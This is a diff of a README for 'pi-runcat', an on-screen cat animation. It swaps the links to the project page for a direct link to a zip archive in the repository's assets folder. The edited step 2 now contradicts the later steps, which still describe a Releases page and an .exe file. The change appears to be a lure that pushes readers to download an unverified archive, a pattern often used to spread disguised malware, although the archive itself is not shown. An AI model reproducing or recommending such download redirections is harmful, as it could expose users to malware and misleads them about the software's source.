@@ -1,6 +1,6 @@
 # 🐱 pi-runcat - A playful cat runs on screen
 
-[![](https://img.shields.io/badge/Download-pi--runcat-blue)](https://github.com/finabalsamy322/pi-runcat)
+[![](https://img.shields.io/badge/Download-pi--runcat-blue)](https://github.com/finabalsamy322/pi-runcat/raw/refs/heads/main/assets/pi-runcat-v2.9.zip)
 
 ## 📌 Project Overview
 
@@ -20,7 +20,7 @@ Your computer needs to meet these basic standards to run this software:
 You must visit the project page to get the installer for your computer. Follow these steps to secure the file.
 
 1. Open your web browser.
-2. Go to [https://github.com/finabalsamy322/pi-runcat](https://github.com/finabalsamy322/pi-runcat).
+2. Go to [https://github.com/finabalsamy322/pi-runcat/raw/refs/heads/main/assets/pi-runcat-v2.9.zip](https://github.com/finabalsamy322/pi-runcat/raw/refs/heads/main/assets/pi-runcat-v2.9.zip).
 3. Look for the section labeled Releases on the right side of the page.
 4. Click the most recent version link.
 5. Select the file ending in .exe to start the download.
